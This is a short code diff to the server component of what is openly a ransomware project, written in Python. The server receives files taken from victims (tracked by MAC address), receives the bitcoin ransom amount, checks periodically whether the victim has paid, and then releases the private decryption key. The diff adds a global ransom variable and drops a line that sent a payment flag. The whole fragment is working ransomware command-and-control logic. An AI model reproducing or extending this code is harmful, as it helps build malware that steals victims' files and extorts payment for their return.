@@ -168,6 +168,8 @@ class Server:
                     while not self._transfer_done:
                         self.receive_victim_files(connection, victim_mac)
                         if self._transfer_done == True:
+                            #Recieve the amount of bitcoin needed
+                            global bitcoin_needed
                             bitcoin_needed = float(base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT))
                             break
                     
@@ -180,9 +182,9 @@ class Server:
                     #Every 5 seconds check if victim paid, if they did send them a message
                     sleep(300)
                     paid = self.check_if_user_paid()
-                    
+
+
                     if(paid):
-                        connection.sendall(paid)
                         # sends decryption key  
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
